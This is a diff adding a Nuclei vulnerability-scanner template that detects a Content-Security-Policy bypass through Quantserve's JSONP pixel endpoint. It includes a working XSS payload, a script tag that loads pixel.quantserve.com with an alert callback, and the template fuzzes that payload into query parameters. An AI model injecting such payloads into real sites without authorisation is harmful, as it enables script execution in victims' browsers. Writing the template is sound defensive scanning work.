@@ -1,0 +1,55 @@
+id: quantserve-pixel-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Quantserve Pixel
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,quantserve-pixel,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "quantserve.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: quantserve_pixel_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://pixel.quantserve.com/api/segments.json?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "quantserve_pixel_csp_xss == true"
+# digest: 490a00463044022010d9cfd11c51f6f5db6e01211fd3b26877fedf186d19e8d7348932616f8a4a2c02202d3d50822c8261f68c50c8a36b031503244d27eb7934efd6b9d0f465286a0a58:922c64590222798bb761d5b6d8e72950
